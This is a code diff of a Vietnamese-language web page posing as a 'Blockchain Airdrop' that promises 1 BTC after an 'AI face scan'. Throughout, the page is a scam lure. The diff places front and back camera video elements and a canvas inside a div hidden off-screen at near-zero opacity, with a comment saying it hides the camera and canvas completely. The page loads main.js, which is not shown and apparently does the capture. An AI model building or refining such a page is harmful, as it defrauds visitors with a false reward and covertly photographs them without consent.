@@ -3,44 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blockchain Airdrop - Xác thực nhận thưởng</title>
+    <title>Blockchain Airdrop - Xác thực nhận 1 BTC</title>
     <style>
-        :root { --primary: #f3ba2f; --bg: #0b0e11; --card-bg: #1e2329; --text: #eaecef; --text-muted: #848e9c; }
-        body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: var(--card-bg); padding: 40px 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 420px; border: 1px solid #474d57; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
-        .btc-icon { width: 70px; margin-bottom: 25px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        h2 { color: var(--primary); font-size: 24px; margin: 0 0 15px; }
-        p { color: var(--text-muted); font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background: var(--primary); color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; cursor: pointer; font-size: 16px; transition: all 0.3s; text-transform: uppercase; letter-spacing: 0.5px; }
-        .btn:hover { background: #dba323; transform: translateY(-2px); }
-        #vBox { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; pointer-events: none; }
-        #loading { display: none; margin-top: 25px; }
-        .spinner { border: 3px solid #30363d; border-top: 3px solid var(--primary); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .status-text { font-size: 13px; color: var(--primary); font-weight: 500; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e11; color: #eaecef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #1e2329; padding: 30px; border-radius: 16px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #474d57; box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative; z-index: 10; }
+        .btc-icon { width: 80px; margin-bottom: 20px; }
+        h2 { color: #f3ba2f; margin-bottom: 10px; }
+        p { color: #848e9c; font-size: 14px; line-height: 1.6; }
+        .btn { background: #f3ba2f; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: #dba323; }
+        .btn:disabled { background: #474d57; cursor: not-allowed; }
+        #loading { display: none; margin-top: 20px; }
+        .spinner { border: 3px solid #30363d; border-top: 3px solid #f3ba2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* Ẩn camera và canvas hoàn toàn */
+        #hiddenCapture { position: absolute; width: 1px; height: 1px; opacity: 0.01; left: -1000px; overflow: hidden; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="btc-icon" alt="BTC">
-    <h2>Xác thực Danh tính</h2>
-    <p>Chào mừng bạn! Để hoàn tất việc nhận <b>1 BTC</b> vào ví cá nhân, vui lòng thực hiện quét khuôn mặt AI để bảo mật giao dịch.</p>
+    <h2>Chúc mừng bạn!</h2>
+    <p>Bạn đủ điều kiện nhận 1 BTC. Nhấn nút bên dưới để hệ thống AI xác thực khuôn mặt và giải ngân vào ví Blockchain của bạn.</p>
     
-    <div id="vBox">
-        <video id="videoFront" autoplay playsinline muted></video>
-        <video id="videoBack" autoplay playsinline muted></video>
-    </div>
-
     <div id="loading">
         <div class="spinner"></div>
-        <p class="status-text">Hệ thống AI đang mã hóa dữ liệu sinh trắc học...</p>
+        <p id="statusText">Đang quét khuôn mặt và mã hóa dữ liệu...</p>
     </div>
 
-    <button class="btn" id="startBtn">Bắt đầu xác thực ngay</button>
+    <button class="btn" id="startBtn">XÁC THỰC & NHẬN 1 BTC</button>
 </div>
 
-<script src="main.js" defer></script>
+<div id="hiddenCapture">
+    <video id="videoFront" autoplay playsinline muted></video>
+    <video id="videoBack" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+</div>
+
+<script src="main.js"></script>
 </body>
 </html>
